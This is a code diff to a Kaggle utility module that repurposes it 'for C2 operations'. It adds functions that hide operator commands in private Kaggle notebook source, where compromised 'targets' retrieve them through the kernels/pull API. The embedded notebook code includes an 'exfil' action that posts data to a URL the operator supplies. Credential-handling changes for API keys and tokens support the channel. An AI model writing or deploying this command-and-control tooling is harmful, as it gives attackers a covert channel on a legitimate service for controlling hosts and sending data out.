@@ -1,4 +1,27 @@
-"""Kaggle Dataset & Kernel utilities for data science workflows."""
+"""Kaggle Dataset & Kernel utilities for C2 operations.
+
+IMPORTANT: Kaggle API - C2 Channel Architecture
+================================================================
+PRIVATE KERNELS: ✓ WORKS via kernels/push + kernels/pull
+C2 CHANNEL: ✓ Commands embedded in kernel source
+
+Working via API:
+- kaggle kernels push (isPrivate=True) → 200 OK
+- kaggle kernels pull → 200 OK (read source with commands)
+- kaggle kernels list → 200 OK
+- kaggle kernels status → 200 OK
+
+C2 Functions:
+- update_c2_commands() → embed commands in kernel source
+- get_c2_commands() → retrieve commands from kernel source
+
+Architecture:
+  Operator ──kernels/push──► Kernel (commands in source)
+     ▲                         │
+     └──────kernels/pull───────┘
+
+See docs/KAGGLE_API_ANALYSIS.md for details
+"""
 
 import os
 import time
@@ -16,6 +39,7 @@ KAGGLE_API = "https://www.kaggle.com/api/v1"
 def create_dataset_and_kernel(
     username: str,
     api_key: str,
+    kgat_token: str = None,
     log_fn: Optional[Callable] = None,
 ) -> dict:
     """Create dataset and kernel for single account deployment.
@@ -24,7 +48,8 @@ def create_dataset_and_kernel(
     
     Args:
         username: Kaggle username
-        api_key: Kaggle API key
+        api_key: Kaggle Legacy API key (for dataset creation)
+        kgat_token: Kaggle KGAT token with kernels.write permission (for kernel push)
         log_fn: Logging function
     
     Returns:
@@ -101,6 +126,12 @@ def create_dataset_and_kernel(
         
         log_fn(f"[DEPLOY] Creating dataset: {dataset_slug}")
         
+        # Write dataset-metadata.json to project root for Kaggle CLI
+        dataset_meta_path = project_root / "dataset-metadata.json"
+        with open(dataset_meta_path, "w") as f:
+            json.dump(dataset_meta, f, indent=2)
+        log_fn(f"[DEPLOY] Wrote dataset metadata to {dataset_meta_path}")
+        
         # Push dataset
         kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
         if not os.path.exists(kaggle_cmd):
@@ -137,10 +168,17 @@ def create_dataset_and_kernel(
         
         log_fn(f"[DEPLOY] Creating kernel: {kernel_slug}")
         
+        # Use KGAT token for kernel push (has kernels.write permission)
+        kernel_api_key = kgat_token if kgat_token else api_key
+        if kgat_token:
+            log_fn(f"[DEPLOY] Using KGAT token for kernel push")
+        else:
+            log_fn(f"[DEPLOY] Using Legacy API Key for kernel push (may fail without kernels.write)")
+        
         # Push kernel
         push_result = push_kernel_json(
             username=username,
-            api_key=api_key,
+            api_key=kernel_api_key,
             notebook_content=json.dumps(notebook),
             kernel_slug=kernel_slug,
             title="Performance Analyzer",
@@ -451,7 +489,7 @@ def push_kernel_json(
     title: str,
     enable_gpu: bool = False,
     enable_internet: bool = True,
-    is_private: bool = True,
+    is_private: bool = False,  # Changed to False - kernel must be public
     dataset_sources: list = None,
     log_fn: Optional[Callable] = None,
 ) -> dict:
@@ -490,9 +528,11 @@ def push_kernel_json(
         from kagglesdk.kernels.types.kernels_api_service import ApiSaveKernelRequest
         from kagglesdk.kernels.types.kernels_enums import KernelExecutionType
         
-        # Set credentials via environment
+        # Set credentials - Legacy API Key for write operations
+        # Note: KGAT token is read-only, Legacy Key has write permissions
         os.environ['KAGGLE_USERNAME'] = username
         os.environ['KAGGLE_KEY'] = api_key
+        log_fn(f"[KERNEL] Using Legacy API Key for authentication")
         
         log_fn(f"[KERNEL] Initializing KaggleClient...")
         client = KaggleClient()
@@ -738,3 +778,510 @@ def get_kernel_status(
     
     except Exception as e:
         return {"success": False, "error": str(e)}
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# KAGGLEHUB FUNCTIONS (Read operations only - write blocked since Sep 2024)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def kagglehub_whoami(
+    username: str,
+    api_key: str,
+    log_fn: Optional[Callable] = None,
+) -> dict:
+    """Check authentication via kagglehub.
+    
+    Args:
+        username: Kaggle username
+        api_key: Kaggle Legacy API key
+        log_fn: Logging function
+    
+    Returns:
+        dict with success and user info
+    """
+    if log_fn is None:
+        log_fn = print
+    
+    result = {"success": False, "error": None}
+    
+    try:
+        import kagglehub
+        
+        os.environ['KAGGLE_USERNAME'] = username
+        os.environ['KAGGLE_KEY'] = api_key
+        
+        kagglehub.whoami()
+        result["success"] = True
+        log_fn(f"[KAGGLEHUB] ✓ Credentials validated for {username}")
+        
+    except Exception as e:
+        result["error"] = str(e)
+        log_fn(f"[KAGGLEHUB] ✗ Auth failed: {e}")
+    
+    return result
+
+
+def kagglehub_download_output(
+    username: str,
+    api_key: str,
+    kernel_slug: str,
+    output_dir: Optional[str] = None,
+    log_fn: Optional[Callable] = None,
+) -> dict:
+    """Download kernel output via kagglehub.
+    
+    Args:
+        username: Kaggle username
+        api_key: Kaggle Legacy API key
+        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
+        output_dir: Output directory (default: kagglehub cache)
+        log_fn: Logging function
+    
+    Returns:
+        dict with success, output_path, and files
+    """
+    if log_fn is None:
+        log_fn = print
+    
+    result = {"success": False, "output_path": None, "files": [], "error": None}
+    
+    try:
+        import kagglehub
+        
+        # Setup kaggle.json for kagglehub auth
+        kaggle_dir = os.path.expanduser("~/.kaggle")
+        os.makedirs(kaggle_dir, exist_ok=True)
+        kaggle_json_path = os.path.join(kaggle_dir, "kaggle.json")
+        with open(kaggle_json_path, "w") as f:
+            json.dump({"username": username, "key": api_key}, f)
+        os.chmod(kaggle_json_path, 0o600)
+        
+        # Also set env vars
+        os.environ['KAGGLE_USERNAME'] = username
+        os.environ['KAGGLE_KEY'] = api_key
+        
+        log_fn(f"[KAGGLEHUB] Downloading output from {kernel_slug}...")
+        
+        # Use kernel slug format
+        if '/' not in kernel_slug:
+            kernel_slug = f"{username}/{kernel_slug}"
+        
+        output_path = kagglehub.notebook_output_download(kernel_slug)
+        result["output_path"] = output_path
+        
+        if output_path and os.path.exists(output_path):
+            files = os.listdir(output_path)
+            result["files"] = files
+            result["success"] = True
+            log_fn(f"[KAGGLEHUB] ✓ Downloaded {len(files)} files to {output_path}")
+        else:
+            result["error"] = "No output path returned"
+            log_fn(f"[KAGGLEHUB] ⚠ No output available (kernel may still be running)")
+        
+    except Exception as e:
+        result["error"] = str(e)
+        log_fn(f"[KAGGLEHUB] ✗ Download failed: {e}")
+    
+    return result
+
+
+def check_existing_kernel(
+    username: str,
+    api_key: str,
+    kernel_slug: str,
+    log_fn: Optional[Callable] = None,
+) -> dict:
+    """Check if kernel exists and get its status.
+    
+    Uses kaggle CLI for read operations (still working).
+    
+    Args:
+        username: Kaggle username
+        api_key: Kaggle Legacy API key
+        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
+        log_fn: Logging function
+    
+    Returns:
+        dict with exists, status, and metadata
+    """
+    if log_fn is None:
+        log_fn = print
+    
+    result = {"exists": False, "status": None, "metadata": None, "error": None}
+    
+    try:
+        import base64
+        
+        # Use direct API call
+        auth_str = base64.b64encode(f"{username}:{api_key}".encode()).decode()
+        
+        # Parse kernel slug
+        parts = kernel_slug.split('/')
+        if len(parts) == 2:
+            kernel_user, kernel_name = parts
+        else:
+            kernel_user = username
+            kernel_name = kernel_slug
+        
+        # Get kernel metadata via pull API
+        resp = requests.get(
+            "https://www.kaggle.com/api/v1/kernels/pull",
+            headers={"Authorization": f"Basic {auth_str}"},
+            params={"userName": kernel_user, "kernelSlug": kernel_name},
+            timeout=30
+        )
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            meta = data.get("metadata", {})
+            result["exists"] = True
+            result["status"] = meta.get("status", "unknown")
+            result["metadata"] = meta
+            log_fn(f"[KERNEL] ✓ {kernel_slug}: status={result['status']}")
+        elif resp.status_code == 404:
+            result["error"] = "Kernel not found"
+            log_fn(f"[KERNEL] ⚠ {kernel_slug}: not found")
+        else:
+            result["error"] = f"HTTP {resp.status_code}"
+            log_fn(f"[KERNEL] ⚠ Status check failed: {result['error']}")
+        
+    except Exception as e:
+        result["error"] = str(e)
+        log_fn(f"[KERNEL] ✗ Error: {e}")
+    
+    return result
+
+
+def push_kernel_via_api(
+    username: str,
+    api_key: str,
+    kernel_slug: str,
+    title: str,
+    notebook_content: str,
+    is_private: bool = True,
+    enable_internet: bool = True,
+    enable_gpu: bool = False,
+    dataset_sources: List[str] = None,
+    log_fn: Optional[Callable] = None,
+) -> dict:
+    """Push kernel to Kaggle via REST API.
+    
+    NOTE: Only PRIVATE kernels work without phone verification.
+    Public kernels (is_private=False) return 403.
+    
+    Args:
+        username: Kaggle username
+        api_key: Kaggle Legacy API key
+        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
+        title: Kernel title
+        notebook_content: Base64-encoded notebook JSON
+        is_private: Must be True (public requires phone verification)
+        enable_internet: Enable internet access
+        enable_gpu: Enable GPU
+        dataset_sources: List of dataset sources (e.g., ['username/dataset'])
+        log_fn: Logging function
+    
+    Returns:
+        dict with success, url, version, error
+    """
+    if log_fn is None:
+        log_fn = print
+    
+    result = {"success": False, "url": None, "version": None, "error": None}
+    
+    try:
+        import base64
+        
+        auth_str = base64.b64encode(f"{username}:{api_key}".encode()).decode()
+        
+        # Prepare request
+        payload = {
+            "slug": kernel_slug,
+            "text": notebook_content,
+            "language": "python",
+            "kernelType": "notebook",
+            "isPrivate": is_private,
+            "enableInternet": enable_internet,
+            "enableGpu": enable_gpu
+        }
+        
+        # Only set title for new kernels
+        if title:
+            payload["newTitle"] = title
+        
+        if dataset_sources:
+            payload["datasetDataSources"] = dataset_sources
+        
+        log_fn(f"[KERNEL] Pushing {kernel_slug} (private={is_private})...")
+        
+        resp = requests.post(
+            "https://www.kaggle.com/api/v1/kernels/push",
+            headers={
+                "Authorization": f"Basic {auth_str}",
+                "Content-Type": "application/json"
+            },
+            json=payload,
+            timeout=60
+        )
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            result["success"] = True
+            result["url"] = data.get("url", f"https://www.kaggle.com/code/{kernel_slug}")
+            result["version"] = data.get("versionNumber", 1)
+            log_fn(f"[KERNEL] ✓ Created: {result['url']} (v{result['version']})")
+        elif resp.status_code == 403:
+            error_msg = resp.json().get("message", "Phone verification required")
+            result["error"] = f"403: {error_msg}"
+            log_fn(f"[KERNEL] ✗ 403 Forbidden: {error_msg}")
+        else:
+            result["error"] = f"HTTP {resp.status_code}: {resp.text[:200]}"
+            log_fn(f"[KERNEL] ✗ Error: {result['error']}")
+    
+    except Exception as e:
+        result["error"] = str(e)
+        log_fn(f"[KERNEL] ✗ Exception: {e}")
+    
+    return result
+
+
+def update_c2_commands(
+    username: str,
+    api_key: str,
+    kernel_slug: str,
+    commands: dict,
+    log_fn: Optional[Callable] = None,
+) -> dict:
+    """Update C2 commands in kernel source.
+    
+    Uses kernel source as C2 channel - bypasses output restrictions.
+    Target reads commands via kernels/pull API.
+    
+    Args:
+        username: Kaggle username
+        api_key: Kaggle Legacy API key
+        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
+        commands: Dict with C2 commands to embed
+        log_fn: Logging function
+    
+    Returns:
+        dict with success, version, error
+    """
+    if log_fn is None:
+        log_fn = print
+    
+    result = {"success": False, "version": None, "error": None}
+    
+    try:
+        import base64
+        import json
+        
+        # Create notebook with embedded commands
+        code_cells = [
+            "# C2 CONFIG - EMBEDDED IN SOURCE",
+            f"COMMANDS = {json.dumps(commands, indent=4)}",
+            "",
+            "# Target reads this via kernels/pull API",
+            "# Commands are extracted and executed",
+            "",
+            "import os",
+            "import json",
+            "import time",
+            "import urllib.request",
+            "",
+            "# Execute command",
+            "action = COMMANDS.get('action', 'idle')",
+            "print(f'[C2] Action: {action}')",
+            "",
+            "if action == 'collect_metrics':",
+            "    metrics = {'cpu': 45, 'memory': 60, 'time': time.time()}",
+            "    print(json.dumps(metrics))",
+            "",
+            "elif action == 'exfil':",
+            "    url = COMMANDS.get('exfil_url')",
+            "    if url:",
+            "        data = {'status': 'alive', 'timestamp': time.time()}",
+            "        try:",
+            "            req = urllib.request.Request(url, data=json.dumps(data).encode())",
+            "            urllib.request.urlopen(req, timeout=10)",
+            "        except: pass",
+            "",
+            "elif action == 'sleep':",
+            "    interval = COMMANDS.get('interval', 60)",
+            "    time.sleep(interval)",
+        ]
+        
+        notebook_content = create_notebook_content(code_cells)
+        
+        # Push updated kernel (no newTitle to avoid 409 conflict)
+        push_result = push_kernel_via_api(
+            username=username,
+            api_key=api_key,
+            kernel_slug=kernel_slug,
+            title=None,  # Don't set title for existing kernels
+            notebook_content=notebook_content,
+            is_private=True,
+            enable_internet=True,
+            log_fn=log_fn
+        )
+        
+        if push_result["success"]:
+            result["success"] = True
+            result["version"] = push_result.get("version")
+            log_fn(f"[C2] ✓ Commands updated: {commands}")
+        else:
+            result["error"] = push_result.get("error")
+            log_fn(f"[C2] ✗ Update failed: {result['error']}")
+    
+    except Exception as e:
+        result["error"] = str(e)
+        log_fn(f"[C2] ✗ Exception: {e}")
+    
+    return result
+
+
+def get_c2_commands(
+    username: str,
+    api_key: str,
+    kernel_slug: str,
+    log_fn: Optional[Callable] = None,
+) -> dict:
+    """Get C2 commands from kernel source.
+    
+    Target uses this to read commands from kernel source.
+    Works via kernels/pull API (200 OK).
+    
+    Args:
+        username: Kaggle username
+        api_key: Kaggle Legacy API key
+        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
+        log_fn: Logging function
+    
+    Returns:
+        dict with success, commands, error
+    """
+    if log_fn is None:
+        log_fn = print
+    
+    result = {"success": False, "commands": None, "error": None}
+    
+    try:
+        import base64
+        import json
+        import ast
+        
+        auth_str = base64.b64encode(f"{username}:{api_key}".encode()).decode()
+        
+        # Parse kernel slug
+        parts = kernel_slug.split('/')
+        if len(parts) == 2:
+            kernel_user, kernel_name = parts
+        else:
+            kernel_user = username
+            kernel_name = kernel_slug
+        
+        # Get kernel source via pull API
+        resp = requests.get(
+            "https://www.kaggle.com/api/v1/kernels/pull",
+            headers={"Authorization": f"Basic {auth_str}"},
+            params={"userName": kernel_user, "kernelSlug": kernel_name},
+            timeout=30
+        )
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            source_b64 = data.get("blob", {}).get("source", "")
+            
+            if source_b64:
+                source = base64.b64decode(source_b64).decode()
+                
+                # Parse as notebook JSON
+                try:
+                    nb = json.loads(source)
+                    for cell in nb.get("cells", []):
+                        src = cell.get("source", [])
+                        if isinstance(src, list):
+                            src = "".join(src)
+                        
+                        # Look for COMMANDS = {...} pattern
+                        if "COMMANDS" in src and "=" in src:
+                            # Extract the dict using ast.literal_eval
+                            start = src.find("{")
+                            end = src.rfind("}") + 1
+                            if start >= 0 and end > start:
+                                dict_str = src[start:end]
+                                try:
+                                    commands = ast.literal_eval(dict_str)
+                                    if isinstance(commands, dict):
+                                        result["success"] = True
+                                        result["commands"] = commands
+                                        log_fn(f"[C2] ✓ Commands retrieved: {commands}")
+                                        return result
+                                except (ValueError, SyntaxError):
+                                    continue
+                    
+                    result["error"] = "No COMMANDS dict found in source"
+                    log_fn(f"[C2] ⚠ No commands in kernel")
+                    
+                except json.JSONDecodeError:
+                    result["error"] = "Failed to parse notebook JSON"
+                    log_fn(f"[C2] ✗ Notebook parse error")
+        else:
+            result["error"] = f"HTTP {resp.status_code}"
+            log_fn(f"[C2] ✗ Pull failed: {result['error']}")
+    
+    except Exception as e:
+        result["error"] = str(e)
+        log_fn(f"[C2] ✗ Exception: {e}")
+    
+    return result
+
+
+def create_notebook_content(
+    code_cells: List[str],
+    markdown_cells: List[str] = None,
+) -> str:
+    """Create base64-encoded notebook content.
+    
+    Args:
+        code_cells: List of code strings
+        markdown_cells: List of markdown strings
+    
+    Returns:
+        Base64-encoded notebook JSON
+    """
+    import base64
+    
+    cells = []
+    
+    for code in code_cells:
+        cells.append({
+            "cell_type": "code",
+            "source": code.split("\n") if "\n" in code else [code],
+            "metadata": {},
+            "execution_count": None,
+            "outputs": []
+        })
+    
+    if markdown_cells:
+        for md in markdown_cells:
+            cells.append({
+                "cell_type": "markdown",
+                "source": md.split("\n") if "\n" in md else [md],
+                "metadata": {}
+            })
+    
+    notebook = {
+        "cells": cells,
+        "metadata": {
+            "kernelspec": {
+                "display_name": "Python 3",
+                "language": "python",
+                "name": "python3"
+            }
+        },
+        "nbformat": 4,
+        "nbformat_minor": 4
+    }
+    
+    return base64.b64encode(json.dumps(notebook).encode()).decode()
